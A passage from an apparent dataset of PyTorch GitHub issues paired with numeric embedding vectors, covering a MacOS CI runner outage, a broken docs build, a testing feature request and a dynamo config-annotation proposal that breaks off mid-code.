 -1.62589699e-02  3.64428051e-02 -9.13690999e-02 -2.96502709e-02
 -2.58924305e-01 -1.39268011e-01  2.37429202e-01  1.87637627e-01
  3.04206133e-01  4.35045958e-02  2.28251159e-01  3.12927291e-02
  7.93738142e-02  7.04240948e-02 -6.34053424e-02  1.73044294e-01
 -1.49117500e-01 -1.52904332e-01 -2.27163821e-01 -1.94837660e-01
 -4.50824201e-02 -2.09519252e-01 -2.12289579e-02  2.88641900e-01
  1.68772023e-02 -2.26637125e-01  1.22101709e-01  1.72658950e-01
  2.86243558e-01 -5.61660528e-02  2.73142129e-01 -1.08376257e-01
  2.21139640e-01  8.54487494e-02  1.71106413e-01  6.10982999e-03
 -8.45673829e-02 -3.16964447e-01  4.70075384e-03  2.36112148e-01
  1.69521093e-01 -5.74435107e-03  3.53172570e-01  6.30737424e-01
  5.00838459e-01  5.58496267e-03 -1.59505099e-01 -8.27732831e-02
 -9.75019336e-02 -3.49369459e-03  4.09313440e-01  3.59959155e-03
 -9.52480957e-02 -1.81604743e-01 -9.67468098e-02 -5.74390702e-02
 -1.80992335e-01  4.92977910e-02 -7.06887618e-02 -6.27577603e-02
 -1.34162575e-01  2.14956850e-01  3.79416794e-02 -1.91564888e-01
  8.18856712e-03  1.14196450e-01  4.85055633e-02  1.06558539e-01
  1.39907271e-01  4.03593928e-02 -2.84577608e-01 -1.12318158e-01
 -2.29600444e-01  3.77853572e-01  2.49131709e-01  6.30028695e-02
  2.39863440e-01  6.73151910e-02  3.94843876e-01 -4.99765933e-01
  3.22385490e-01  1.25545278e-01  7.62905777e-02 -1.74984366e-01
 -8.24660361e-02  3.38426381e-02 -3.03026289e-01 -9.34228227e-02
 -8.52237940e-02  1.51828766e-01 -4.12049554e-02 -2.56089866e-01
  1.05621308e-01 -1.64992183e-01  4.02047873e-01 -7.66985044e-02
 -1.50363579e-01 -3.27628553e-01  2.02295989e-01  4.15840119e-01
  3.00496757e-01  3.04314315e-01  2.70259231e-01 -5.31627052e-03
 -5.01799285e-02  2.94961751e-01  2.35152781e-01  1.15332961e-01
 -7.27737397e-02  4.00458351e-02 -1.74090013e-01 -4.07527119e-01
  6.04243502e-02 -3.42800468e-02 -6.81697354e-02  9.95737016e-02
 -1.27766691e-02 -1.66917779e-02 -3.07794511e-01 -4.79561538e-02
 -2.86577404e-01  1.01743594e-01 -2.29644746e-01 -5.06587252e-02
  1.94451809e-01 -5.45125231e-02 -8.98924768e-02 -5.48889279e-01
 -1.82801262e-01 -8.53512436e-04 -1.45936757e-01 -4.70393419e-01
 -1.72773488e-02 -1.30879238e-01 -3.03129256e-01 -9.31605995e-02
  5.40126301e-02  1.57945782e-01 -2.32806236e-01  2.51316309e-01
  1.17515877e-01  1.80015981e-01  7.46874660e-02 -2.26416409e-01
 -1.24849230e-01 -7.95439482e-02 -2.69048750e-01 -1.73736721e-01
  1.47973150e-01  6.07253052e-03 -7.39394128e-02 -1.73948854e-01
  2.65688062e-01  7.46410713e-02  1.13138840e-01  1.83982346e-02
  1.94401532e-01 -1.95178241e-01  2.59585567e-02  1.76443741e-01
 -4.49061871e-01  1.20856784e-01 -3.07765063e-02 -5.31388633e-02
  1.87247992e-03  1.03448823e-01 -2.22399771e-01 -1.27103239e-01
 -3.22461545e-01 -4.95161191e-02 -3.96132469e-02 -3.62037629e-01
  1.58226773e-01 -1.45590022e-01 -5.49957715e-02  1.35656834e-01
 -2.85112292e-01 -9.28609818e-03 -2.48647183e-02 -1.04354300e-01
 -1.65780157e-01  2.66755164e-01 -1.12727687e-01  2.22535029e-01
  1.58975601e-01  1.62035853e-01 -3.45796347e-01  5.63189760e-02
  5.29729091e-02  3.71586978e-02  1.92579329e-02 -4.50994939e-01
  1.76643759e-01 -1.09929502e-01  2.32183129e-01 -8.52780789e-02
  7.12866068e-01 -6.41118810e-02  2.97862947e-01 -1.39235854e-01
  3.00282538e-01  1.95460230e-01  7.22602159e-02  1.99266434e-01
  5.26115112e-02 -3.39532435e-01 -7.17151240e-02  2.06917897e-03
 -8.47008377e-02 -2.26195693e-01 -3.91394228e-01  1.10814862e-01
  1.40735269e-01 -4.73177582e-02 -5.12956902e-02  2.37299889e-01
  5.17074279e-02  1.44121587e-01 -3.27330828e-02  1.85293555e-01
 -1.34212524e-01  1.55043989e-01  1.09361649e-01 -1.83488429e-01
 -3.28731209e-01  1.97755992e-01  2.06649661e-01 -3.95943969e-03
  3.46761495e-01 -1.71581477e-01  1.26084387e-01  2.48157054e-01
  3.41956951e-02  3.76724482e-01 -1.70297891e-01  2.30580848e-02
  8.64673406e-02  3.61187309e-01  2.35005524e-02  1.12472698e-02
 -8.19112137e-02 -4.26023781e-01 -3.05917203e-01  1.18226513e-01
  4.38140891e-02  3.06595027e-01 -3.15059602e-01  8.14907625e-03
 -1.31357193e-01 -1.38729468e-01  2.60115743e-01 -6.12812415e-02
  3.48854624e-02  5.49710989e-01  1.22655973e-01 -2.18575716e-01
 -1.27382517e-01  2.14961484e-01  1.27384663e-01 -2.46810943e-01
 -1.30748957e-01 -1.52353197e-01  3.10767740e-02 -1.96328968e-01
  2.52284147e-02 -2.06188142e-01  1.62702799e-01  5.38762212e-01
  4.53026593e-02  2.39041984e-01  1.17601834e-01  1.05908424e-01
 -1.53223753e-01 -2.28976198e-02  2.99088955e-01  4.22355205e-01
  2.32073247e-01  7.17175007e-02 -4.10979241e-01  1.82635635e-01
  7.17237070e-02  1.83652267e-01 -3.81539106e-01 -1.59999773e-01
  1.25983313e-01 -3.85279834e-01  1.16801240e-01 -1.74846157e-01
  1.02099292e-01  9.64600593e-02 -4.50709760e-01 -6.33401424e-02
 -8.40609670e-02  1.78522408e-01  4.83083546e-01 -1.31362602e-02
  1.95875108e-01 -2.76535481e-01  1.76968247e-01  6.01802841e-02
 -1.12348482e-01  3.19777936e-01 -9.43181813e-02  6.95208460e-03]"
MacOS outage (2023-10-13) ci: sev ci: sev-infra.pet ci: sev-infra.os,"## Current Status
Ongoing

## Error looks like
All MacOS runners are gone.

## Incident timeline (all times pacific)
1700 PST

## User impact
No runner to run MacOS jobs

## Root cause
It's unclear. I ran https://github.com/fairinternal/pytorch-gha-infra/actions/runs/6513098460 earlier in the afternoon, so it could be the trigger.  But this looks like yet another runner update from GitHub.

## Mitigation
Move MacOS job to unstable

## Prevention/followups
TBD

cc @jeanschmidt @DanilBaibak 
",False,"[ 9.24887061e-02 -1.21876858e-01  1.15311116e-01  2.42095776e-02
  9.45950001e-02 -2.56918550e-01 -1.01105481e-01  3.90833467e-02
 -7.04700798e-02 -3.36930633e-01  1.94657966e-01  1.74625963e-03
 -2.98414737e-01  1.07255653e-02 -3.00218523e-01 -1.51199728e-01
 -1.85388833e-01 -5.00573754e-01  7.58177340e-02 -1.23656094e-01
  3.80525216e-02 -6.32953346e-02 -2.12540373e-01 -7.05434233e-02
 -3.56034398e-01  5.17289400e-01 -8.10158402e-02  3.20146292e-01
 -3.64262909e-01  2.40242958e-01  7.12015405e-02  9.98246819e-02
 -4.85512614e-03 -2.56953180e-01  6.35674357e-01  1.75870880e-01
 -2.49899756e-02 -2.22208887e-01 -5.30411303e-01 -1.09719142e-01
 -1.28027707e-01 -7.53309131e-02 -4.98444438e-02 -7.51664639e-02
  7.95341656e-03 -6.89842030e-02 -5.69747686e-02 -4.67975110e-01
 -2.20234498e-01 -2.63244718e-01  2.73858726e-01  2.14627326e-01
  3.63434196e-01 -4.03022259e-01  2.94608086e-01  1.59223646e-01
 -2.08962083e-01  3.31339240e-01  3.40873897e-01  1.15059040e-01
  3.35775852e-01  3.20702612e-01 -3.26428533e-01  1.12899512e-01
  7.63208494e-02 -2.04501394e-02  2.96550333e-01 -4.80336249e-02
 -8.02075118e-02 -1.14411503e-01 -4.46932465e-02  1.37962639e-01
 -8.21049213e-02  6.30524978e-02  1.85536504e-01  5.66227198e-01
 -2.70850182e-01 -1.72845423e-01 -1.22389033e-01 -4.01743472e-01
  1.14490792e-01 -2.80175865e-01 -2.45868728e-01  1.00797184e-01
  2.87400484e-01  9.98095125e-02 -3.56384069e-02 -2.30402455e-01
  1.88839585e-01  1.49240151e-01  4.06621039e-01 -1.58898205e-01
  1.62029460e-01 -8.15798640e-02  4.32463825e-01 -9.01311785e-02
  9.19272751e-02  3.65553021e-01 -8.10263678e-04  1.20789364e-01
 -3.59950624e-02  1.50832757e-01 -2.77964417e-02  2.45478392e-01
  6.51552528e-03 -1.81507111e-01  3.95122200e-01  1.97392285e-01
  1.95642680e-01  1.24940097e-01  1.31537929e-01 -8.46096724e-02
  6.11531436e-02 -1.79868191e-03  2.37670019e-01  9.48617384e-02
 -2.63776720e-01  1.31982356e-01  6.64934367e-02  3.74945223e-01
  2.33733192e-01 -4.59091544e-01 -4.20084089e-01 -4.69883829e-02
 -1.34421457e-02  1.06633201e-01 -2.89791584e-01  3.45194072e-01
 -2.46591821e-01 -8.85664374e-02  1.31792845e-02 -1.98490143e-01
  1.88395381e-01 -1.75924838e-01 -6.74100220e-02  2.38388926e-01
 -2.47250963e-02 -1.01744071e-01 -1.23867676e-01  1.46289468e-01
  1.43583044e-01 -3.13157260e-01  2.87769407e-01 -1.39518514e-01
  2.84328818e-01 -1.38483703e-01 -3.42818797e-02  8.44918713e-02
  2.17951760e-01 -3.76350343e-01 -3.04546244e-02  1.12860620e-01
 -2.37633467e-01  4.39586520e-01 -2.50833541e-01 -2.34092191e-01
  3.71381789e-01  1.18192047e-01 -2.38212943e-01 -9.73752886e-03
  2.39858016e-01  2.78693363e-02 -9.84758697e-03  2.72518218e-01
  5.35351336e-01 -5.47309481e-02 -2.25251377e-01 -2.05061689e-01
 -9.12591890e-02 -1.29531443e-01 -1.23739541e-02  6.97795153e-02
 -3.09979497e-03 -2.77028471e-01  1.72538068e-02 -3.05253893e-01
  2.50620306e-01  3.63540620e-01 -1.64211959e-01  7.32567310e-02
  2.96756655e-01 -9.49484557e-02  1.52121242e-02  2.81154037e-01
 -1.26327664e-01  5.03706280e-04 -1.82526007e-01  2.86564231e-01
 -2.02250779e-01  3.48807633e-01 -5.70119977e-01 -1.32124722e-01
  2.88614213e-01  1.99297100e-01  1.04358494e-01 -2.09882900e-01
 -3.15166950e-01  1.50520682e-01 -1.63641796e-01  3.85217309e-01
 -6.66322410e-02 -1.29997775e-01 -2.11682439e-01 -2.10039049e-01
 -2.26279140e-01  1.61308691e-01 -3.63379419e-01 -1.81525633e-01
 -7.40918666e-02 -4.59046215e-02  1.49139434e-01 -2.66590536e-01
  2.06559837e-01  1.28893912e-01  4.16829586e-02  1.16711289e-01
 -9.74699855e-02  1.65963143e-01  1.74228787e-01  1.71135902e-01
 -3.03126544e-01 -1.43654048e-01 -2.31539965e-01 -1.96890295e-01
  2.44796708e-01  2.60504097e-01 -2.08447188e-01 -7.85773769e-02
 -1.14463933e-01  1.58185735e-01  3.37246433e-02  1.05641708e-01
  9.45072174e-02 -3.56474668e-01  2.75949202e-02  3.60907987e-03
  1.90335855e-01 -1.08756498e-01 -2.38949478e-01  1.47113621e-01
 -3.46110165e-01 -8.40790719e-02 -2.27246732e-01 -2.34235227e-01
  8.95130187e-02  1.75995193e-02 -9.61133838e-02  3.79810706e-02
 -1.60076097e-01  1.05109759e-01  5.00522494e-01  3.18747818e-01
 -3.95664930e-01 -1.19772600e-02 -8.32347497e-02  2.82519102e-01
 -6.08724654e-02  2.49476984e-01 -1.68922544e-01  3.04039180e-01
  5.79441823e-02  3.06974918e-01  3.59055251e-01  1.63426608e-01
  1.63961217e-01  6.00207686e-01 -7.58366808e-02  1.17913596e-02
  7.95709491e-02  1.47509217e-01  4.06680778e-02 -4.61420834e-01
  3.32523257e-01 -2.67137170e-01  3.66282701e-01 -1.53352797e-01
  1.81955129e-01  1.50534928e-01  7.91719742e-03  1.76055342e-01
 -6.15836494e-02  1.07066661e-01 -4.24891412e-01  4.22109589e-02
  3.02799881e-01  7.56655447e-03 -7.38448799e-02 -4.07644272e-01
  4.02288288e-02 -2.03240991e-01  1.35912001e-01 -1.95694342e-01
  4.26868707e-01 -1.59710184e-01 -1.63068742e-01  3.00569057e-01
 -2.92898685e-01 -9.55719128e-02 -1.77657902e-01 -3.18828642e-01
 -2.87989348e-01  5.31946085e-02 -6.79642558e-02  1.98445946e-01
 -1.25957541e-02 -5.25111854e-02  7.75510445e-02  6.05619214e-02
  3.92641753e-01 -5.37087396e-02 -2.68026069e-03  2.46846303e-01
  2.50253454e-02  7.67641142e-02 -9.53683630e-03  8.71065259e-02
 -3.01069021e-01  3.90391588e-01 -2.00326636e-01  1.05582625e-01
  5.03180400e-02  6.53867722e-02 -2.97305763e-01  3.34881961e-01
  6.08322263e-01  4.03596103e-01 -3.23976725e-01 -3.61664474e-01
  1.64848909e-01 -1.80640101e-01  2.37136275e-01 -2.11826295e-01
 -1.54531792e-01  2.01090232e-01 -1.69510886e-01  2.28616565e-01
 -3.26067597e-01  2.07678944e-01 -9.67314392e-02 -3.73139977e-01
 -3.04086626e-01 -2.45292991e-01  1.41010154e-03  1.69757843e-01
  6.79216832e-02 -2.81648099e-01  5.51391393e-02  8.63488019e-02
  2.48697698e-02  1.03935070e-01 -6.23346090e-01  1.27995431e-01
 -1.94324389e-01 -7.82806277e-02 -9.18141529e-02  3.03439736e-01
 -1.81221962e-01  3.46300423e-01 -1.29170623e-02  1.53792202e-01
 -3.14519882e-01  7.76305571e-02 -6.35415673e-01  1.41181841e-01
 -1.87780619e-01  8.71071965e-02 -4.32253689e-01  3.42072964e-01
 -4.48138416e-02 -4.08889890e-01 -8.85420740e-02 -6.85614720e-02
 -2.30187908e-01  3.07639778e-01  3.42144161e-01 -1.21604621e-01
  2.46330947e-01 -1.54235110e-01 -1.64245963e-01  2.21182898e-01
  6.93978295e-02 -3.85727659e-02 -2.57109880e-01  4.86268178e-02]"
UNSTABLE pull / linux-docs / build-docs-python-false module: ci unstable,"Broken by https://github.com/pytorch/pytorch/pull/111108, cannot revert normally. Asking the author to forward fix.

cc @seemethere @malfet @pytorch/pytorch-dev-infra",False,"[-2.33352125e-01 -4.31899041e-01 -5.42789996e-02  4.09222662e-01
 -1.03330560e-01 -3.82330954e-01 -1.53268605e-01  7.48095959e-02
 -3.08436483e-01 -4.69118878e-02  6.15286262e-05  3.08391929e-01
 -1.55841053e-01  2.34724884e-03 -5.18711627e-01  3.75133194e-03
 -3.48400116e-01 -2.07201377e-01  3.90493199e-02  9.94321704e-02
 -2.99322337e-01  1.24337666e-01 -3.52366388e-01  4.26912084e-02
  6.90196827e-02  2.41569635e-02 -1.79308444e-01 -7.27410987e-02
 -5.09913750e-02  9.39460322e-02  2.22769827e-01  3.11478972e-01
 -2.04672635e-01 -1.40739158e-01  2.66306728e-01  2.70328164e-01
 -1.99438289e-01 -3.87949258e-01  1.00065656e-01 -2.40104631e-01
 -1.28664836e-01  1.07694738e-01 -1.06280625e-01  1.86648309e-01
 -2.07371354e-01 -7.29917064e-02 -4.09583226e-02  3.83018032e-02
 -2.75802668e-02 -1.00718930e-01 -3.88170719e-01  2.36466676e-01
  6.59809187e-02 -3.14529061e-01  1.08986378e-01 -1.83469206e-01
  1.29168287e-01  6.23287797e-01  1.16522692e-01 -8.13020989e-02
  5.23373187e-01 -1.04518197e-02  1.96725041e-01  7.70425573e-02
 -1.99559674e-01  2.78993040e-01  4.41789068e-02 -2.17100367e-01
  2.89644241e-01 -7.20847324e-02  9.52816233e-02 -5.29684089e-02
 -5.68010032e-01 -1.59238100e-01  1.58840984e-01 -1.77954882e-01
 -8.85253027e-02  1.24574840e-01 -1.81446537e-01  7.36510456e-02
 -1.47430569e-01 -1.91512212e-01 -7.37700760e-02 -2.33780041e-01
 -1.45120516e-01 -6.84036985e-02  1.78819358e-01 -2.74405599e-01
  1.24954291e-01  7.62677891e-03  5.58988988e-01  5.89878783e-02
  2.90396035e-01  2.59120792e-01  1.61791489e-01  1.18769012e-01
  3.83042381e-03  1.11685909e-01 -8.90104100e-02 -6.74253628e-02
  1.41785085e-01 -1.31384805e-01 -3.79562587e-01  2.68515974e-01
 -1.63673963e-02 -2.79972583e-01  2.02122837e-01 -6.64221644e-02
  2.51053218e-02 -6.57088459e-02  3.02201062e-01 -5.74718649e-03
  3.26496482e-01  1.15149297e-01  2.93947645e-02  5.97730577e-02
 -3.04239064e-01  1.64935783e-01 -4.41921949e-01  4.12788391e-01
  1.58004746e-01  1.10630188e-02 -3.11245143e-01  6.20072000e-02
  1.79009721e-01  1.27113745e-01  2.76880041e-02  1.32030591e-01
  7.31071085e-02 -1.10992938e-01  1.39695451e-01 -9.99666899e-02
 -3.49750429e-01 -1.51343849e-02 -1.52852952e-01  2.04343945e-01
 -1.21152565e-01 -3.80926698e-01 -5.99980243e-02  7.66052455e-02
 -2.40285695e-01 -3.72416265e-02 -1.71728373e-01 -4.76647854e-01
  1.66407809e-01 -6.41190857e-02 -2.80598491e-01  1.56282991e-01
 -9.14856568e-02  1.85582608e-01 -1.22605570e-01 -1.34213030e-01
 -1.78033352e-01  4.58383262e-01  1.55603230e-01  3.22809885e-03
  2.27651060e-01  5.98449968e-02 -3.25392008e-01 -3.92544061e-01
 -1.41801566e-01  2.43436366e-01 -3.16591471e-01 -2.93311067e-02
 -9.93218124e-02  4.34253067e-02 -4.44769979e-01 -1.17276348e-01
 -1.21689461e-01  9.77080911e-02 -1.65958121e-01  2.72985455e-02
  5.53379893e-01 -9.69970152e-02 -2.05002446e-02  4.35159653e-02
 -8.80014971e-02  3.39401811e-02  2.17926294e-01  3.19709122e-01
  2.10241452e-01  3.39727521e-01  1.62545770e-01  2.25329593e-01
  4.13978547e-02  3.35583746e-01  1.89875886e-02  1.56941459e-01
  9.59348157e-02 -7.40173906e-02  1.77175160e-02 -7.43208006e-02
  9.06451046e-02  2.95485202e-02  1.22701421e-01  1.53202474e-01
 -1.21317707e-01  3.62257361e-01 -1.07982561e-01  2.67572016e-01
 -2.34016150e-01  1.35529742e-01  1.16032287e-01  4.29583602e-02
 -3.17795984e-02 -1.88401043e-01 -9.02082771e-02 -3.55548680e-01
 -1.43724486e-01  8.92800540e-02 -2.12168559e-01 -2.43713289e-01
 -1.70415416e-01 -2.68521786e-01 -4.11194742e-01  4.32911329e-02
  2.29319260e-01  5.77058643e-02  1.50278941e-01  4.28915136e-02
 -2.09660381e-01 -2.09660549e-02  3.72261137e-01 -1.34617269e-01
  2.12211028e-01 -4.03681606e-01 -6.40729442e-02  1.83819309e-01
 -1.90168574e-01  6.04434013e-02 -2.41819054e-01  1.44811552e-02
  3.31458658e-01  6.92076012e-02  2.05237150e-01 -4.52293493e-02
 -4.55990694e-02 -1.51343122e-01  9.00321677e-02  3.99399608e-01
 -1.33163124e-01 -2.95470888e-03 -1.09517306e-01  5.99336773e-02
  1.69333324e-01  1.67681962e-01 -1.64598115e-02  7.35322461e-02
 -3.05616289e-01  3.34252324e-03  2.69998498e-02 -2.73752958e-01
  6.09746873e-02 -2.01688856e-02  3.22320014e-01 -6.74673468e-02
 -1.17632069e-01  2.18982071e-01  4.43421379e-02  6.19076788e-02
  1.45338371e-01  4.69791055e-01 -1.30653411e-01  2.72304237e-01
  2.31012121e-01  4.02521223e-01 -2.52827853e-01  1.09684035e-01
  1.26321509e-01 -1.94042251e-01  1.49175540e-01 -4.43147779e-01
  1.50287673e-01 -1.05460279e-01  4.33468759e-01 -4.50411774e-02
  5.89359522e-01  2.49756929e-02 -8.46611783e-02 -5.26540447e-03
 -1.69628605e-01  3.71922776e-02 -2.30452895e-01  3.39516640e-01
  2.58063734e-01 -2.05595687e-01  7.59267807e-02 -2.21488044e-01
 -2.68322021e-01 -3.60735394e-02 -2.04513147e-01  1.52356073e-01
  3.77178460e-01  4.16550152e-02  1.66811854e-01  1.38990998e-01
  5.16708679e-02 -4.24517393e-02  3.90315264e-01  2.45158643e-01
 -3.09048831e-01 -1.82890624e-01 -4.17265594e-01  8.99468660e-02
  1.93530858e-01  6.92143589e-02 -1.96947724e-01  1.08218700e-01
 -3.17957848e-02 -2.61653185e-01  1.19340189e-01  1.82533279e-01
 -1.05293572e-01  2.90970296e-01 -1.12868056e-01 -1.00501902e-01
  3.80592607e-02  2.19870284e-01  1.30851284e-01  4.19131443e-02
 -1.14705615e-01  1.02471262e-02 -3.11062247e-01 -6.23805188e-02
  4.19282079e-01  4.30953177e-03 -2.73749828e-01  2.70499345e-02
 -4.15452123e-01 -1.58371642e-01 -6.81879744e-02 -6.65418580e-02
 -2.90864538e-02  1.53557226e-01 -8.73290226e-02  2.04218715e-01
 -1.60124123e-01 -3.13506350e-02  1.90921739e-01 -7.97783732e-02
 -4.65768427e-02 -4.40856904e-01  2.98490554e-01 -9.94681865e-02
 -3.00160319e-01 -4.14337218e-02  2.94805527e-01  1.71320349e-01
 -9.87584740e-02 -2.00364932e-01  8.76265317e-02  3.14950384e-02
 -2.99483597e-01  2.34584630e-01 -1.54991642e-01  2.61162549e-01
  1.88020483e-01  4.04151201e-01 -2.04470739e-01  3.04003149e-01
 -4.12980378e-01 -7.67551214e-02 -4.16978449e-01 -1.49351493e-01
 -2.17807367e-01 -2.75045425e-01  1.29816672e-02  2.30109036e-01
 -1.36861593e-01  4.59457152e-02  4.63979095e-02  1.51190206e-01
 -2.42018342e-01  3.51370931e-01  3.91899914e-01 -4.51239124e-02
  5.60103133e-02  3.27280611e-01 -3.20757598e-01 -8.19556862e-02
 -5.36040105e-02  3.53014201e-01  2.78969914e-01  1.15825228e-01]"
Test factory functions with layout=torch.strided good first issue triaged module: testing,"### ðŸš€ The feature, motivation and pitch

It'd be nice to have an OpInfo-based test that tests this. See https://github.com/pytorch/pytorch/pull/111205 and the issue that the PR resolves.

### Alternatives

_No response_

### Additional context

_No response_",False,"[-8.32118988e-01  3.68885219e-01 -2.21518233e-01 -1.60620391e-01
  8.74694288e-02 -2.02855811e-01  1.65146008e-01  2.37453952e-01
 -5.27530849e-01 -3.63269150e-01  2.68650800e-01 -1.33565187e-01
 -1.50111899e-01  1.58470720e-01  1.31648004e-01 -2.88721055e-01
  8.99802372e-02  1.62338823e-01 -1.59034297e-01 -1.67133629e-01
 -8.85125622e-03 -1.36450361e-02  8.36616829e-02 -1.27209738e-01
 -1.81742057e-01  6.38213754e-02 -1.44100031e-02 -6.84050657e-03
  1.29634246e-01  9.43353400e-02  3.57310593e-01  3.27636421e-01
 -2.59249657e-01  8.20722207e-02  1.46866485e-01  8.70178044e-02
 -1.35354564e-01 -2.03454405e-01 -3.59132499e-01 -2.27093715e-02
  1.27609238e-01  1.49791420e-01 -1.99099496e-01  1.76550955e-01
  1.60752386e-02 -1.30639300e-01 -1.25484183e-01  1.97774604e-01
 -4.33653712e-01  3.03696864e-03  1.79145798e-01 -2.20974460e-01
 -2.31316149e-01 -3.15710634e-01  2.40867615e-01 -2.22182199e-01
  2.16376632e-01  5.42738438e-02  1.27950758e-01 -2.53101051e-01
  1.21615946e-01 -1.50775790e-01  4.25168723e-02  1.42381281e-01
  2.64568001e-01 -1.44173667e-01 -1.26793429e-01 -7.77996331e-02
  2.67154545e-01  1.52300552e-01 -2.83577770e-01 -1.35950133e-01
 -1.14900678e-01 -5.28755672e-02  3.91122252e-02  1.37955189e-01
 -6.47153497e-01 -7.91442022e-02 -9.99226496e-02 -2.42300078e-01
  2.73158461e-01 -1.99920237e-01  1.37547493e-01  2.59674430e-01
  1.99677452e-01  4.19288911e-02  2.05046162e-01 -6.82495825e-04
  1.24963932e-01  1.09433979e-01 -1.83374900e-02  1.18649654e-01
 -2.27412403e-01  3.48310322e-01 -1.07939266e-01  3.21672857e-01
  7.22860321e-02 -1.67646319e-01 -2.22915158e-01 -5.91251366e-02
 -1.78596795e-01 -5.96867204e-01 -6.45781010e-02  1.74781933e-01
 -1.21332528e-02 -2.56074309e-01 -1.94216132e-01  3.64580601e-02
  3.69398892e-01  2.19052248e-02  3.74787673e-02  1.82449877e-01
 -1.85995325e-02 -2.13998500e-02 -3.51776816e-02 -1.93314359e-01
 -1.26536697e-01 -1.26756623e-01  1.97019503e-01  1.07006550e-01
  4.18129951e-01 -2.36163232e-02  3.42836939e-02  1.84836867e-03
  4.56060410e-01 -1.28821522e-01 -2.91288555e-01  2.68697768e-01
  1.19334370e-01  1.58032939e-01  7.15860277e-02  4.74048629e-02
  2.61101693e-01 -6.22949488e-02  2.33146057e-01  2.99535133e-02
 -8.71947706e-02  2.64110953e-01 -1.57960519e-01  6.36840463e-02
 -2.29884610e-01  2.02579543e-01 -1.24800034e-01 -1.68366164e-01
 -2.26692744e-02 -1.34976640e-01 -3.82089764e-01  1.84305459e-01
 -9.91038978e-02 -6.38065785e-02  1.65798277e-01 -1.31704032e-01
 -2.10628867e-01  4.09637213e-01  7.94756338e-02 -1.06222518e-01
  1.01661652e-01  1.76341012e-01  2.48572543e-01 -3.18919033e-01
 -7.78272226e-02  4.58329797e-01  1.26123786e-01  3.76641974e-02
  3.71229529e-01 -1.60413533e-01 -9.33764577e-02 -1.66853964e-01
 -3.74985814e-01 -1.43670693e-01  1.43886402e-01 -8.79664198e-02
  4.33650473e-03 -8.43023881e-02  4.50160354e-02 -2.13199090e-02
 -1.32651582e-01 -1.14429757e-01 -8.67694095e-02  4.83520329e-01
  4.20058250e-01  1.74480289e-01  2.78291285e-01 -4.78716847e-03
 -6.05539456e-02  3.77015769e-01  2.42824167e-01  1.18550204e-01
 -1.76444352e-01  8.96207336e-03 -3.23373944e-01 -2.65285879e-01
  1.10691646e-02  4.54425812e-03 -1.82624683e-01 -2.10147172e-01
  3.44624698e-01  1.23862460e-01  9.38871223e-03  1.53032243e-01
 -7.85576105e-02  1.08866513e-01 -8.22440088e-02 -4.19910818e-01
  1.74482837e-01  3.48581582e-01 -3.22301179e-01 -4.28363562e-01
  3.32747474e-02 -1.12938881e-03 -2.81617075e-01 -3.02574128e-01
 -4.97776307e-02 -2.44861141e-01  8.89278054e-02  1.43915847e-01
 -2.67099768e-01  4.96568978e-02 -3.73749100e-02  1.41466424e-01
  1.88647225e-01  1.03477433e-01  5.62942401e-02 -3.72710109e-01
 -1.38103604e-01  4.80850905e-01 -2.44859174e-01  6.84154853e-02
 -1.12618372e-01 -7.31608644e-02  6.71663359e-02 -4.87117857e-01
  1.27970368e-01  7.41299614e-02  1.16995513e-01  2.39370674e-01
 -6.59115538e-02 -1.44173905e-01  7.96093345e-02 -1.19163163e-01
 -3.54799002e-01 -4.75928068e-01  5.81728518e-02 -7.62665570e-02
  1.35104626e-01  2.70373791e-01 -4.36505735e-01  2.12683335e-01
  5.25063612e-02  6.44341409e-02 -1.70343012e-01 -2.99100757e-01
  7.40903094e-02  9.88571569e-02  2.53696889e-01  2.14448363e-01
  2.14957386e-01  1.52933925e-01  9.20308530e-02 -1.83790684e-01
  2.57240623e-01  3.06681931e-01  1.22991599e-01  2.80731082e-01
  6.08322263e-01 -9.06493887e-02 -4.31038477e-02  2.27453992e-01
 -1.88360304e-01  7.98961893e-03  3.03467870e-01 -3.80198181e-01
  2.94769645e-01  1.62389368e-01  2.02489525e-01  1.46650657e-01
  2.76530564e-01 -2.84699470e-01  8.39957967e-02 -4.28638011e-02
  1.60619408e-01 -2.00681597e-01 -6.62137987e-03  4.16900486e-01
  1.24014340e-01 -1.95917174e-01 -2.60450859e-02 -8.43681917e-02
 -9.01692286e-02 -2.67919302e-01 -3.92731786e-01 -1.62383541e-01
  3.18174511e-01  1.18153848e-01 -4.73224759e-01  3.71901631e-01
  1.94044918e-01 -3.22814256e-01  1.92393854e-01  1.34421334e-01
 -9.95778665e-02  8.90510306e-02  7.86208212e-02 -2.87885219e-01
 -1.52062297e-01 -9.03846547e-02  2.72438586e-01 -1.97190624e-02
  5.23064554e-01 -9.35480222e-02 -1.90336227e-01  3.13973784e-01
 -9.85179916e-02  2.07711101e-01  4.89357188e-02  1.67341232e-01
 -2.55487859e-01  1.24777794e-01 -2.92640775e-01  7.39537776e-02
 -8.59829709e-02 -3.12192231e-01 -1.72200836e-02  9.12016556e-02
  9.83055085e-02  1.58480227e-01 -8.96340311e-02  4.65152301e-02
 -2.77389474e-02  1.13622516e-01 -7.13522686e-03  1.10170402e-01
  1.31215468e-01  1.75750107e-01 -4.21819538e-02 -1.89657554e-01
 -4.20610346e-02  5.77353001e-01  9.19427897e-04 -2.54171461e-01
 -3.50451291e-01 -6.76549077e-02 -2.96080142e-01 -2.26449668e-01
 -3.32308590e-01 -1.27813965e-01  2.28492439e-01 -5.39557934e-02
  1.87884554e-01  1.18072875e-01  5.22044711e-02  1.56252533e-01
 -2.06670642e-01  1.25935599e-02  7.35375807e-02  3.24499369e-01
  8.50963220e-02  1.09844133e-02  1.61501870e-01  5.60118295e-02
 -1.75154150e-01 -2.13515330e-02 -3.25303644e-01 -2.66635567e-02
 -1.13517024e-01  1.48500070e-01  2.70130128e-01 -3.77164930e-01
 -4.66982462e-02  3.47037435e-01 -3.45313191e-01  1.51178822e-01
 -7.18102679e-02 -1.87420063e-02  2.58679092e-01 -1.92882478e-01
  3.30367118e-01 -2.52009273e-01  2.62116879e-01  2.04779550e-01
 -1.08101308e-01  5.04439510e-02  7.58232325e-02  6.71482384e-02]"
[dynamo] annotate configs with `@compile_ignored`  triaged module: dynamo,"### ðŸš€ The feature, motivation and pitch

Originated: https://github.com/pytorch/pytorch/pull/111074#discussion_r1358455363

Tracked: https://github.com/pytorch/pytorch/issues/111220

This annotation means that we will not recompile if these configs change

We will also store separate dicts instead of a single `_config`:
`_compile_config` and `_compile_ignored`.

We can thus more quickly read and hash this config.

---

Currently ignorable dynamo configs:
```python
dynamo_guarded_config_ignorelist = {
    ""log_file_name"",
    ""verbose"",
    ""verify_correctness"",  # will not affect model, will raise RuntimeError
    # (no silent change to compilation behaviour)
    ""cache_size_limit"",
